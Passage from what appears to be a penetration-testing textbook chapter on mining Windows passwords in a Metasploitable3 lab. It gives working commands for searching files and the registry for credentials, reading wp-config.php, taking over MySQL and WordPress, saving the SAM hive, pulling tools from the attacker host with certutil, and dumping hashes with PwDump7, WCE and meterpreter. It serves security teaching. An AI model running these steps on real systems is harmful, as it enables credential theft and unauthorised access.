<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer193">
			<h1 id="_idParaDest-98"><em class="italic"><a id="_idTextAnchor101"/>Chapter 7</em>: Windows Password Mining</h1>
			<p>An important privilege escalation attack vector that usually goes unexplored is the process of searching for locally stored credentials on the target system. This process involves searching for specific passwords and password hashes that can then be used to elevate privileges directly, without the use of any exploits.</p>
			<p>This chapter will focus on the process of searching for passwords and dumping password hashes on the target system by using various utilities and techniques.</p>
			<p>We will also take a look at how Windows <strong class="bold">NT LAN Manager</strong> (<strong class="bold">NTLM</strong>) hashes can be cracked and utilized to elevate privileges on a target system.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>What is password mining?</li>
				<li>Searching for passwords in files</li>
				<li>Searching for passwords in Windows configuration files</li>
				<li>Searching for application passwords</li>
				<li>Dumping Windows hashes</li>
				<li>Cracking Windows hashes</li>
			</ul>
			<h1 id="_idParaDest-99"><a id="_idTextAnchor102"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you are familiar with Windows CMD commands.</p>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3ogOyCN">https://bit.ly/3ogOyCN</a></p>
			<h1 id="_idParaDest-100"><a id="_idTextAnchor103"/>What is password mining?</h1>
			<p><strong class="bold">Password mining</strong> is the <a id="_idIndexMarker393"/>process of searching for and enumerating encrypted or cleartext passwords stored in persistent or volatile memory on the target system. The primary objective of this process involves identifying potentially useful user accounts and application passwords, which can then expand our authority over a target system and potentially provide us with elevated privileges.</p>
			<p>Given the nature of Windows configurations and deployment use cases, this process will differ from target to target. Therefore, it is important to have a good understanding of how and where passwords, both encrypted and cleartext, are stored on Windows.</p>
			<p>It is also important to understand that this process relies on a series of vulnerabilities that are a result of an organization's or individual's password security practices. Poor password security practices are the primary target for attackers as they provide a straightforward access vector, without the need for further system exploitation or compromise.</p>
			<p>Because of the amount of credentials that are required by various platforms and applications, employees <a id="_idIndexMarker394"/>and individuals are prone to saving their credentials on their systems in cleartext, usually in <strong class="source-inline">.doc</strong>, <strong class="source-inline">.txt</strong>, or <strong class="source-inline">.xlsx</strong> files for ease of access, and are more likely to use weaker passwords that comprise events, names, or dates that are relevant to them. This is a significant threat to the security of an organization and as a result, most organizations enforce a password security policy as a means of remediating these issues.</p>
			<p>Password security policies are used to establish a baseline security level for user account passwords and enforce the secure storage and use of stronger passwords that comprise words (both uppercase and lowercase), symbols, and numbers with a recommended minimum length of 8 digits. However, this gives rise to the occurrence of password reuse, where employees and individuals are likely to reuse the same password for multiple accounts, primarily because of the complex nature of the passwords they are required to use. This allows attackers to gain access to multiple accounts by compromising a single password.</p>
			<p>An additional security vulnerability or risk involves Windows user account passwords and how they are stored. Windows encrypts and stores user account passwords locally and in memory. After initial access has been obtained by an attacker, user account hashes can be dumped from memory and can be cracked, depending on the length and strength of the password. We will explore the advantages and drawbacks of this technique later in this chapter.</p>
			<p>From an organizational standpoint, Windows is also used to host third-party, business-critical applications that come with their own security vulnerabilities. Most of these applications implement some form of access control and, consequently, require user authentication in the form of a username and password combination. These applications are also prone to storing credentials locally in either cleartext or in encrypted format. After successfully exploiting an application, attackers can locate these credentials, decrypt them (if they're weak), and use them to gain access to the application and, consequently, expand their domain of control over a system or network.</p>
			<p>In this chapter, we will be using the Metasploitable3 target virtual machine that we set up in <a href="B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030"><em class="italic">Chapter 2</em></a>, <em class="italic">Setting Up Our Lab</em>.</p>
			<p>Metasploitable3 is an intentionally vulnerable virtual machine that runs on <strong class="bold">Windows Server 2008 R2</strong> and hosts a plethora of applications, from web apps to databases.</p>
			<p>This robust configuration of applications provides a great real-world scenario for a practical demonstration of the tools and techniques that we will be using in this chapter.</p>
			<p>Before we<a id="_idIndexMarker395"/> begin, ensure that you have a foothold of the target system and have access through a command shell or meterpreter session.</p>
			<p>The techniques and tools that will be used in this chapter will involve utilizing native Windows commands and specific meterpreter modules, to help automate various aspects of the password mining and dumping process. </p>
			<h1 id="_idParaDest-101"><a id="_idTextAnchor104"/>Searching for passwords in files</h1>
			<p>The first<a id="_idIndexMarker396"/> step of this process involves searching for passwords in various files stored locally. This will allow us to identify any user or application passwords in text or configuration files. This can be achieved by using built-in Windows utilities that allow us to search for specific strings in files with specific extensions.</p>
			<p>We will begin this process by following the different procedures outlined here:</p>
			<ul>
				<li>The first step involves searching the local filesystem for a specific string. In this case, the string we will be searching for is <strong class="source-inline">password</strong>. This will enumerate all occurrences of the string, their values, and their respective filenames and locations. This can be done by running the <strong class="source-inline">findstr</strong> utility in the Windows command shell:<p class="source-code"><strong class="bold">findstr /si password *.txt</strong></p><p>This command will perform a case-sensitive search for the <strong class="source-inline">password</strong> string in all subdirectories.</p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">findstr</strong> is a Windows utility that is used to search for strings in files and can be used in conjunction with various regular expressions to fine tune your searches.</p><p>To perform a thorough search, it is recommended to run the <strong class="source-inline">findstr</strong> utility at the root of <a id="_idIndexMarker397"/>the Windows filesystem. This can be done by navigating to the <strong class="source-inline">C:\\</strong> directory and initiating the search from there.</p><p>This will output a list of all <strong class="source-inline">.txt</strong> files that contain the <strong class="source-inline">password</strong> string, as illustrated in the following screenshot:</p></li>
			</ul>
			<div>
				<div id="_idContainer161" class="IMG---Figure">
					<img src="Images/B17389_07_001.jpg" alt="Figure 7.1 – findstr results&#13;&#10;" width="1586" height="312"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.1 – findstr results</p>
			<p>The command will output a lot of information based on the configuration of the system and the number of applications that have been installed. As a result, it is recommended to output the results to a file for in-depth analysis as the results can be tedious to analyze manually.</p>
			<ul>
				<li>We can also use the <strong class="source-inline">findstr</strong> utility to search for the <strong class="source-inline">password</strong> string in <strong class="source-inline">*.xml</strong> files. This can be done by running the following command:<p class="source-code"><strong class="bold">findstr /si password *.xml</strong></p><p>As shown in the following screenshot, this will output a list of all occurrences of the <strong class="source-inline">password</strong> string in <strong class="source-inline">.xml</strong> files. </p><p>You can also fine-tune your search to limit the results to the files that contain occurrences of the string by running the following command:</p><p class="source-code"><strong class="bold">findstr /si /m "password" *.xml *.ini *.txt</strong></p><p>This will limit <a id="_idIndexMarker398"/>the output of the search to the files that have the string specified in the search query:</p></li>
			</ul>
			<div>
				<div id="_idContainer162" class="IMG---Figure">
					<img src="Images/B17389_07_002.jpg" alt="Figure 7.2 – finstr XML results&#13;&#10;" width="1089" height="304"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.2 – finstr XML results</p>
			<ul>
				<li>We can also perform a comprehensive search for a specific string in all the files and directories on the target system. This can be done by running the following command:<p class="source-code"><strong class="bold">findstr /spin "password" *.* -</strong></p><p>This command will output all files, regardless of their formats or extensions, that have occurrences of the <strong class="source-inline">password</strong> string within them. </p><p>Based on the deployment use case of the target, you may receive a lot of matches for the <strong class="source-inline">password</strong> string or none at all. We will take a closer look at how to fine-tune our searches based on the type of password we are looking for in the next section.</p></li>
				<li>We can also search for various strings in files by using the <strong class="source-inline">dir</strong> command on Windows. This can be done by running the following command:<p class="source-code"><strong class="bold">dir /s *pass* == *cred* == *vnc* == *.config*</strong></p><p>As shown in the following screenshot, the command will output all occurrences of the strings specified and their respective locations. This particular scan is much more comprehensive and has a higher probability of returning useful and actionable results:</p></li>
			</ul>
			<div>
				<div id="_idContainer163" class="IMG---Figure">
					<img src="Images/B17389_07_003.jpg" alt="Figure 7.3 – Directory search results&#13;&#10;" width="1135" height="465"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.3 – Directory search results</p>
			<p>As highlighted <a id="_idIndexMarker399"/>in the preceding screenshot, the search reveals the location of files that contain the strings specified in the search. In this particular case, we can identify the location of the local and domain passwords for the <strong class="bold">GlassFish</strong> server. We can use these credentials to take control of the service.</p>
			<p>We will take a closer look at how to search for application-specific passwords in the upcoming sections and how they can be used to elevate our privileges. </p>
			<p>Now that we know how to search for useful strings in files on the target system, we will take a look at how to search for passwords in Windows configuration files.</p>
			<h1 id="_idParaDest-102"><a id="_idTextAnchor105"/>Searching for passwords in Windows configuration files</h1>
			<p>Windows<a id="_idIndexMarker400"/> can automate a variety of <a id="_idIndexMarker401"/>repetitive tasks, such as the mass rollout or installation of Windows on many systems. An example of this is the <strong class="bold">Unattended Windows Setup</strong> utility, which automates the mass installation of Windows. This tool utilizes configuration files that contain specific configurations and user account credentials that can be used by attackers to elevate privileges. In this section, we will be taking a look at how to search for and identify the configuration files that are used during the Unattended Windows Setup process.</p>
			<p>It is important to note that this technique will vary based on the version of Windows being use, as well as whether Windows was installed using the Unattended Windows Setup utility. Given the typical use case of the Unattended Windows Setup utility, this method will be useful when it's employed in an organization-specific environment. However, you may run into individual systems that utilize the Unattended Windows Setup utility.</p>
			<p>In our case, our target system was not set up and configured using the Unattended Windows Setup utility, so the following techniques will not be directly applicable. However, it is a vitally important aspect of the password mining process:</p>
			<ol>
				<li value="1">The first step involves searching for and identifying the Unattended Windows Setup configuration files that were left over. The names of the configuration file will vary based on the version of Windows that's been installed. The file typically has one of the following names:<p>- <strong class="source-inline">Unattend.xml</strong></p><p>- <strong class="source-inline">Autounattend.xml</strong></p><p>The location of the configuration file will also depend on the version of Windows that's been installed and can typically be found in one of the following locations:</p><p class="source-code">C:\\Windows\Panther\Unattend\Unattended.xml</p><p class="source-code">C:\\Windows\Panther\Unattdended.xml</p><p>As highlighted in the following Terminal output, if the configuration file exists, it should contain the <strong class="source-inline">Administrator</strong> password in cleartext or encoded in Base64 so<a id="_idIndexMarker402"/> that it can be<a id="_idIndexMarker403"/> decrypted to reveal the cleartext password:</p><p class="source-code"><strong class="bold">&lt;component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64"&gt;</strong></p><p class="source-code"><strong class="bold">    &lt;AutoLogon&gt;</strong></p><p class="source-code"><strong class="bold">     &lt;Password&gt;UGFzc3dvcmQxMjM=&lt;/Password&gt;</strong></p><p class="source-code"><strong class="bold">     &lt;Enabled&gt;true&lt;/Enabled&gt;</strong></p><p class="source-code"><strong class="bold">     &lt;Username&gt;Administrator&lt;/Username&gt;</strong></p><p class="source-code"><strong class="bold">    &lt;/AutoLogon&gt;</strong></p><p class="source-code"><strong class="bold">    &lt;UserAccounts&gt;</strong></p><p class="source-code"><strong class="bold">     &lt;LocalAccounts&gt;</strong></p><p class="source-code"><strong class="bold">      &lt;LocalAccount wcm:action="add"&gt;</strong></p><p class="source-code"><strong class="bold">       &lt;Password&gt;*SENSITIVE*DATA*DELETED*&lt;/Password&gt;</strong></p><p class="source-code"><strong class="bold">       &lt;Group&gt;administrators;users&lt;/Group&gt;</strong></p><p class="source-code"><strong class="bold">       &lt;Name&gt;Administrator&lt;/Name&gt;</strong></p><p class="source-code"><strong class="bold">      &lt;/LocalAccount&gt;</strong></p><p class="source-code"><strong class="bold">     &lt;/LocalAccounts&gt;</strong></p><p class="source-code"><strong class="bold">    &lt;/UserAccounts&gt;</strong></p><p>The encrypted password can be decrypted using the built-in base64 utility on Kali Linux. This can be done by running the following command:</p><p class="source-code"><strong class="bold">echo "&lt;ENCRYPTED-PASSWORD&gt;" | base64 -d</strong></p></li>
				<li>Windows installations can also be automated using a Windows utility called <strong class="bold">Sysprep</strong>. Sysprep <a id="_idIndexMarker404"/>is used to deploy Windows images to different systems and can also be used in conjunction with the Windows Unattended Setup utility to prepare the image for deployment.<p>Similarly, <strong class="bold">Sysprep</strong> also utilizes configuration files that contain customizations and user credentials. If these files are not cleaned up, they can reveal useful credentials. The name of the configuration file will vary based on the version of Windows<a id="_idIndexMarker405"/> that's <a id="_idIndexMarker406"/>been installed. The file typically has one of the following names:</p><p>- <strong class="source-inline">Sysprep.inf</strong></p><p>- <strong class="source-inline">Sysprep.xml</strong></p><p>The location of the configuration file will also depend on the version of Windows that's been installed and can typically be found under one of the following locations:</p><p class="source-code">C:\\sysprep.inf</p><p class="source-code">C:\\sysprep\sysprep.xml</p><p>As highlighted in the following screenshot, If the configuration file exists, it should contain the administrator password in cleartext:</p><div id="_idContainer164" class="IMG---Figure"><img src="Images/B17389_07_004.jpg" alt="Figure 7.4 – Sysprep.xml password&#13;&#10;" width="355" height="121"/></div><p class="figure-caption">Figure 7.4 – Sysprep.xml password</p><p>If these configuration files exist, they offer a straightforward path to authenticate to the system as the admin user attains elevated privileges.</p></li>
				<li>The next point of interest in Windows is its registry. The Windows Registry is a database that is responsible for storing settings and configurations for Windows and other applications installed on the system. We can search the registry for specific strings to reveal user credentials. This can be done by running the following commands:<p class="source-code"><strong class="bold">reg query HKLM /f password /t REG_SZ /s</strong></p><p class="source-code"><strong class="bold">reg query HKCU /f password /t REG_SZ /s</strong></p><p>As highlighted<a id="_idIndexMarker407"/> in the following<a id="_idIndexMarker408"/> screenshot, this will output all the registry entries that match the <strong class="source-inline">password</strong> string:</p></li>
			</ol>
			<div>
				<div id="_idContainer165" class="IMG---Figure">
					<img src="Images/B17389_07_005.jpg" alt="Figure 7.5 – Windows Registry search" width="1162" height="328"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.5 – Windows Registry search</p>
			<p>In this particular case, we did not find anything of interest. As a result, we will now turn our attention to finding and enumerating application-specific passwords.</p>
			<h1 id="_idParaDest-103"><a id="_idTextAnchor106"/>Searching for application passwords</h1>
			<p>Applications <a id="_idIndexMarker409"/>are an enticing target for attackers when they have weaknesses and vulnerabilities in them. How they store credentials can lead to complete system compromise or elevated privileges. </p>
			<p>This section will focus on finding and enumerating application credentials. The techniques demonstrated in this section will depend on the type of target you are dealing with and its deployment use case. In our particular case, our target virtual machine has been set up as a server and has various applications installed on it.</p>
			<p>In <a href="B17389_03_Final_PG_ePub.xhtml#_idTextAnchor045"><em class="italic">Chapter 3</em></a>, <em class="italic">Gaining Access (Exploitation)</em>, we performed a comprehensive Nmap scan on our target and identified several applications, most of which were web applications that utilize some form of authentication. These are some of the applications we can target:</p>
			<ul>
				<li>MySQL Server</li>
				<li>phpMyAdmin</li>
				<li>WordPress</li>
			</ul>
			<p>Let's learn how to find and identify the configuration files that are used to store credentials by <a id="_idIndexMarker410"/>these applications:</p>
			<ol>
				<li value="1">The first step in this process is to identify the web hosting stack being used. As highlighted in the following screenshot, navigating to the root of the filesystem reveals that the hosting stack that's been installed is <strong class="bold">Windows Apache MySQL PHP</strong> (<strong class="bold">WAMP</strong>):<div id="_idContainer166" class="IMG---Figure"><img src="Images/B17389_07_006.jpg" alt="Figure 7.6 – WAMP" width="660" height="470"/></div><p class="figure-caption">Figure 7.6 – WAMP</p><p>We can explore the contents of the <strong class="source-inline">wamp</strong> directory to determine what web applications are being hosted. This can be done by running the following command:</p><p class="source-code"><strong class="bold">cd wamp\www\</strong></p><p>As highlighted in the following screenshot, the contents of the directory reveal that WordPress has been installed on the server:</p><div id="_idContainer167" class="IMG---Figure"><img src="Images/B17389_07_007.jpg" alt="Figure 7.7 – WordPress directory&#13;&#10;" width="161" height="215"/></div><p class="figure-caption">Figure 7.7 – WordPress directory</p><p><strong class="bold">WordPress</strong> is a content<a id="_idIndexMarker411"/> management system that requires a database – in this case, <strong class="bold">MySQL</strong> – to store data and user credentials. Connecting to the database is facilitated through a remote connection, and the database access credentials are stored in the <strong class="source-inline">wp-config.php</strong> file. We can list the contents of this file by navigating into the WordPress installation directory and running the following command in the Windows command shell:</p><p class="source-code"><strong class="bold">type wp-config.php</strong></p><p>As highlighted in the following screenshot, the content of the file reveals the MySQL username and password combination that we can use to log in:</p><div id="_idContainer168" class="IMG---Figure"><img src="Images/B17389_07_008.jpg" alt="Figure 7.8 – wp-config.php MySQL credentials&#13;&#10;" width="772" height="287"/></div><p class="figure-caption">Figure 7.8 – wp-config.php MySQL credentials</p></li>
				<li>In this case, we can get the root username and password for the MySQL server and log in remotely from Kali by running the following command:<p class="source-code"><strong class="bold">mysql -u root -p -h &lt;TARGET-IP&gt;</strong></p><p>As highlighted in the following screenshot, after successful authentication, we should now have root access to the MySQL Server and view and dump the contents <a id="_idIndexMarker412"/>of any database on the server:</p><div id="_idContainer169" class="IMG---Figure"><img src="Images/B17389_07_009.jpg" alt="Figure 7.9 – MySQL login&#13;&#10;" width="787" height="249"/></div><p class="figure-caption">Figure 7.9 – MySQL login</p></li>
				<li>We can now dump the list of databases on the server. This can be done by running the following command in the MySQL prompt:<p class="source-code"><strong class="bold">show databases;</strong></p><p>As highlighted in the following screenshot, the command will output a list of databases on the server:</p><div id="_idContainer170" class="IMG---Figure"><img src="Images/B17389_07_010.jpg" alt="Figure 7.10 – MySQL databases" width="347" height="332"/></div><p class="figure-caption">Figure 7.10 – MySQL databases</p></li>
				<li>We can <a id="_idIndexMarker413"/>dump the contents of the WordPress database by running the following command in the MySQL prompt:<p class="source-code"><strong class="bold">use wordpress;</strong></p><p>This reveals a list of tables in the WordPress database. We can dump the user credentials for the WordPress installation by running the following command:</p><p class="source-code"><strong class="bold">select * from wp_users;</strong></p><p>As highlighted in the following screenshot, this will reveal the WordPress user's credentials:</p><div id="_idContainer171" class="IMG---Figure"><img src="Images/B17389_07_011.jpg" alt="Figure 7.11 – WordPress credentials&#13;&#10;" width="556" height="230"/></div><p class="figure-caption">Figure 7.11 – WordPress credentials</p><p>The user passwords are encrypted in MD5 and can be decrypted to reveal the cleartext password.</p></li>
				<li>Additionally, given the fact that we have root access to the MySQL server, we can change the password for the admin account by running the following command:<p class="source-code"><strong class="bold">update wp_users set user_pass = MD5('password123!') where ID = 1;</strong></p><p>We can now log into the WordPress admin dashboard with the password we have just set and should have administrative control over the WordPress site.</p><p>So far, we have<a id="_idIndexMarker414"/> taken control of the MySQL Server and the WordPress site. Now, let's find the credentials of the other applications.</p></li>
				<li>The server is also running phpMyAdmin. We can gain access to the phpMyAdmin control panel by accessing the content of the file, as follows:<p class="source-code"><strong class="bold">C:\wamp\apps\phpmyadmin3.4.10.1\config.inc.ini.php</strong></p><p>As highlighted in the following screenshot, this will reveal the access credentials for the phpMyAdmin control panel:</p></li>
			</ol>
			<div>
				<div id="_idContainer172" class="IMG---Figure">
					<img src="Images/B17389_07_012.jpg" alt="Figure 7.12 – phpMyAdmin credentials&#13;&#10;" width="558" height="445"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.12 – phpMyAdmin credentials</p>
			<p>We should now have root access to the phpMyAdmin control panel and be able to create, modify, and delete the contents of databases.</p>
			<p>Now that we <a id="_idIndexMarker415"/>have taken control of the MySQL Server and the WordPress site, we can start dumping Windows user account hashes to elevate our privileges.</p>
			<h1 id="_idParaDest-104"><a id="_idTextAnchor107"/>Dumping Windows hashes</h1>
			<p>In this section, we<a id="_idIndexMarker416"/> will take a closer look at Windows passwords and how they are hashed. The hash dumping process on Windows can be performed by using various techniques and tools, most of which we will explore in this section. Before we begin using any tools or techniques, we need to take a brief look at how Windows passwords are stored.</p>
			<h2 id="_idParaDest-105"><a id="_idTextAnchor108"/>SAM database</h2>
			<p><strong class="bold">Security Account Manager</strong> (<strong class="bold">SAM</strong>) is <a id="_idIndexMarker417"/>a database<a id="_idIndexMarker418"/> that is responsible for managing user accounts and passwords on Windows. All the passwords that are stored in the SAM database are hashed. Authentication<a id="_idIndexMarker419"/> and verification of user credentials is facilitated by the <strong class="bold">local security authority</strong> (<strong class="bold">LSA</strong>). </p>
			<p>The SAM database is stored in the Windows Registry and can be accessed from the following location:</p>
			<p class="source-code">HKEY_LOCAL_MACHINE\SAM</p>
			<p>Now that we know where Windows user credentials are stored, we need to take a closer look at <strong class="bold">LanMan</strong> (<strong class="bold">LM</strong>) and NTLM authentication.</p>
			<h2 id="_idParaDest-106"><a id="_idTextAnchor109"/>LM and NTLM hashing</h2>
			<p>LM is <a id="_idIndexMarker420"/>an<a id="_idIndexMarker421"/> authentication<a id="_idIndexMarker422"/> protocol<a id="_idIndexMarker423"/> that's developed by IBM and widely implemented in Windows operating systems prior to NT4.0. The protocol is used to encrypt user passwords, and the hashing process can be broken down into the following steps:</p>
			<ol>
				<li value="1">The password is converted into a hash by breaking it into two seven-character chunks.</li>
				<li>All characters are then converted into uppercase.</li>
				<li>Each chunk is then encrypted with a 56-bit DES key.</li>
			</ol>
			<p>LM is generally considered to be a weak protocol and can easily be cracked, primarily because of the following reasons:</p>
			<ol>
				<li value="1">The 56-bit DES key is weak and can be cracked relatively easily.</li>
				<li>Because the characters are converted into uppercase, this makes the cracking process relatively simple through a brute-force or dictionary attack.</li>
				<li>Versions of Windows that utilize LM are restricted to a maximum of 14 characters for user account passwords.</li>
			</ol>
			<p>Now that <a id="_idIndexMarker424"/>we<a id="_idIndexMarker425"/> understand how<a id="_idIndexMarker426"/> LM hashing works, we can look at NTLM <a id="_idIndexMarker427"/>hashing, which is an improvement in terms of security over LM.</p>
			<p>NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.</p>
			<p>NTLM authentication operates under the client-server model of communication and involves a handshake process, similar to the TCP three-way handshake. We explored the NTLM authentication process in the previous chapter, so we will only be exploring the differences between LM and NTLM hashing here. </p>
			<p>NTLM operates under a challenge response system, and the hashing process can be broken down into the following steps:</p>
			<ol>
				<li value="1">When a user account is created, it is encrypted using the MD4 hashing algorithm, while the original password is disposed of.</li>
				<li>During authentication, the username is sent to the server. The server then creates a 16-byte random string and sends it to the client. This is known as the challenge.</li>
				<li>The client encrypts the string with the password hash using the <strong class="bold">Data Encryption Standard</strong> (<strong class="bold">DES</strong>) algorithm and sends it back to the server. This is known as<a id="_idIndexMarker428"/> the response.</li>
				<li>The server then compares the hashed string (response) to the original. If it matches, authentication is completed.</li>
			</ol>
			<p>The following <a id="_idIndexMarker429"/>table<a id="_idIndexMarker430"/> highlights<a id="_idIndexMarker431"/> the key differences between LM and NTLM and<a id="_idIndexMarker432"/> how each protocol handles encryption:</p>
			<div>
				<div id="_idContainer173" class="IMG---Figure">
					<img src="Images/B17389_07_Table1.jpg" alt="" width="1650" height="610"/>
				</div>
			</div>
			<p>Now that we understand how LM and NTLM hashing works, we can begin exploring the process of dumping hashes on our target system. </p>
			<h3>Utilizing PwDump7</h3>
			<p>The first<a id="_idIndexMarker433"/> tool we will be utilizing is called <strong class="source-inline">PwDump7.exe</strong>. It <a id="_idIndexMarker434"/>is a Windows binary that extracts the SAM database and dumps the hashes. It needs to be run locally on the target system. You can download the binary from this link: <a href="https://www.tarasco.org/security/pwdump_7/">https://www.tarasco.org/security/pwdump_7/</a>.</p>
			<p>After downloading the binary, we need to transfer it to the target system. This can be done automatically through meterpreter by running the following command in the meterpreter shell:</p>
			<p class="source-code">upload ~/Downloads/pwdump7/PwDump7.exe</p>
			<p>Alternatively, if you are running a standard command shell, we will need to set up a web server on our Kali VM. This will be used to host the binary so that we can download it on the target system. This can be done by following the procedure outlined here.</p>
			<p>To set up a web server on our Kali VM, we can utilize the <strong class="source-inline">SimpleHTTPServer</strong> Python module to serve the binary file. This can be done by running the following command in the directory where the <strong class="source-inline">PwDump7.exe</strong> binary is stored:</p>
			<p class="source-code">sudo python -m SimpleHTTPServer 80</p>
			<p>To download the <strong class="source-inline">PwDump7.exe</strong> binary on the target system, we can utilize the <strong class="source-inline">certutil</strong> utility. However, before we can download the binary, we need to navigate to a directory where we have read and write permissions. In this case, we will navigate to the current user's <strong class="source-inline">Desktop</strong> directory.</p>
			<p>We can now use the <strong class="source-inline">certutil</strong> utility to download the binary from the Kali VM onto our target system. This can be done by running the following command on the target system:</p>
			<p class="source-code">certutil -urlcache -f http://&lt;KALI-VM-IP&gt;/PwDump7.exe PwDump7.exe</p>
			<p>As shown in the following screenshot, if the transfer is successful, the binary should be downloaded and saved with the name we specified:</p>
			<div>
				<div id="_idContainer174" class="IMG---Figure">
					<img src="Images/B17389_07_013.jpg" alt="Figure 7.13 – certutil successful transfer&#13;&#10;" width="639" height="379"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.13 – certutil successful transfer</p>
			<p>We can also<a id="_idIndexMarker435"/> save the registry values of the SAM file<a id="_idIndexMarker436"/> manually on the target system and use the PwDdump utility to dump the hashes. This can be done by running the following command:</p>
			<p class="source-code">reg save hklm\sam c:\sam</p>
			<p>If the operation was successful, you should receive a message similar to the one highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer175" class="IMG---Figure">
					<img src="Images/B17389_07_014.jpg" alt="Figure 7.14 – Dump SAM" width="334" height="32"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.14 – Dump SAM</p>
			<p>We can now execute the binary to dump the hashes by running the following command:</p>
			<p class="source-code">.\PwDump7.exe -s &lt;SAMFILE&gt; &lt;SYSTEM-FILE&gt;</p>
			<p>This will dump the Windows hashes from the SAM database, which we will crack in the next section.</p>
			<p>In the case of our target system, this technique will not work. However, it is a useful utility and will work on most versions of Windows.</p>
			<h3>Utilizing SamDump2</h3>
			<p>We can also<a id="_idIndexMarker437"/> save the registry values of the SAM file <a id="_idIndexMarker438"/>manually on the target system and use the SamDump2 utility to dump the hashes. This can be done by running the following command:</p>
			<p class="source-code">reg save hklm\sam c:\sam</p>
			<p>If the operation was successful, you should receive a message similar to the one highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer176" class="IMG---Figure">
					<img src="Images/B17389_07_015.jpg" alt="Figure 7.15 – Dump SAM&#13;&#10;" width="332" height="30"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.15 – Dump SAM</p>
			<p>We can now download the SAM file from the root of the filesystem to our Kali VM. This can be done automatically through meterpreter by running the following command:</p>
			<p class="source-code">download sam</p>
			<p>As highlighted in the following screenshot, the SAM file should be downloaded to our home directory on Kali:</p>
			<div>
				<div id="_idContainer177" class="IMG---Figure">
					<img src="Images/B17389_07_016.jpg" alt="Figure 7.16 – Downloading the SAM file&#13;&#10;" width="697" height="111"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.16 – Downloading the SAM file</p>
			<p>We can now use the SamDump2 utility on Kali Linux to dump the hashes from the file. This can be done by running the following command on Kali:</p>
			<p class="source-code">samdump2 system sam</p>
			<p>This will dump the hashes from the SAM file, which we can now crack to obtain the cleartext password.</p>
			<p>This process can also be automated using the <strong class="source-inline">hashdump</strong> meterpreter command, like so:</p>
			<p class="source-code">hashdump</p>
			<p>If successful, the output should reveal all the user account hashes on the system, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer178" class="IMG---Figure">
					<img src="Images/B17389_07_017.jpg" alt="Figure 7.17 – Hashdump&#13;&#10;" width="906" height="482"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.17 – Hashdump</p>
			<p>In this particular<a id="_idIndexMarker439"/> case, the <strong class="source-inline">hashdump</strong> command<a id="_idIndexMarker440"/> gives us all the user account hashes on the system. We can save the hashes into a file called <strong class="source-inline">hashes.txt</strong> on our Kali virtual machine. We will take a look at how to use these hashes in the next section.</p>
			<h3>Utilizing Windows Credentials Editor </h3>
			<p>Another <a id="_idIndexMarker441"/>great utility <a id="_idIndexMarker442"/>we can use to dump password hashes is the <strong class="bold">Windows Credentials Editor</strong>, also known as <strong class="bold">WCE</strong>. WCE lists logon sessions and their corresponding NTLM hashes. The binary comes pre-packaged with Kali and will need to be run locally on the target system.</p>
			<p>We can upload the binary to the target using meterpreter by running the following command:</p>
			<p class="source-code">upload /usr/share/windows-resources/wce/wce64.exe</p>
			<p>In the event you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p>
			<p>After transferring the binary to the target system, we can execute the binary by running the following command:</p>
			<p class="source-code">.\wce64.exe</p>
			<p>This will output a list of logon sessions and their corresponding hashes, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer179" class="IMG---Figure">
					<img src="Images/B17389_07_018.jpg" alt="Figure 7.18 – WCE hashes&#13;&#10;" width="1268" height="156"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.18 – WCE hashes</p>
			<p>In this particular <a id="_idIndexMarker443"/>case, we were<a id="_idIndexMarker444"/> only able to dump the hashes for the currently logged on users.</p>
			<p>We can also use the <strong class="source-inline">wce.exe</strong> binary to dump the password hashes and their corresponding cleartext equivalents. This can be done by running the following command:</p>
			<p class="source-code">.\wce64.exe -w</p>
			<p>In this particular case, we retrieved the hashes and cleartext passwords for the vagrant user and the SSH user, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer180" class="IMG---Figure">
					<img src="Images/B17389_07_019.jpg" alt="Figure 7.19 – WCE cleartext passwords&#13;&#10;" width="1268" height="253"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.19 – WCE cleartext passwords</p>
			<p>We can also use another great Metasploit post-exploitation module to dump password hashes and access tokens from the system. This can be done by loading the following module after putting your meterpreter session in the background:</p>
			<p class="source-code">use post/windows/gather/credential/credential_collector</p>
			<p>Now, we need to configure the module and change the relevant module options. In this case, the only option that needs to be configured is the <strong class="source-inline">SESSION</strong> option. We can set the <strong class="source-inline">SESSION</strong> option by running the following command:</p>
			<p class="source-code">set SESSION &lt;SESSION-ID&gt;</p>
			<p>The following screenshot outlines the module option that needs to be configured in order to run the module:</p>
			<div>
				<div id="_idContainer181" class="IMG---Figure">
					<img src="Images/B17389_07_020.jpg" alt="Figure 7.20 – Module options&#13;&#10;" width="752" height="247"/>
				</div>
			</div>
			<p class="figure-caption">Figure 7.20 – Module options</p>
			<p>Now, we can <a id="_idIndexMarker445"/>run the module <a id="_idIndexMarker446"/>by running the following command in the Metasploit console:</p>
			<p class="source-code">run</p>
			<p>If successful, the module should output a list of password hashes and access tokens that can be utilized to elevate our privileges, as shown in the following screenshot:</p>
			<div>
				<div id="_idContainer182" class="IMG---Figure">
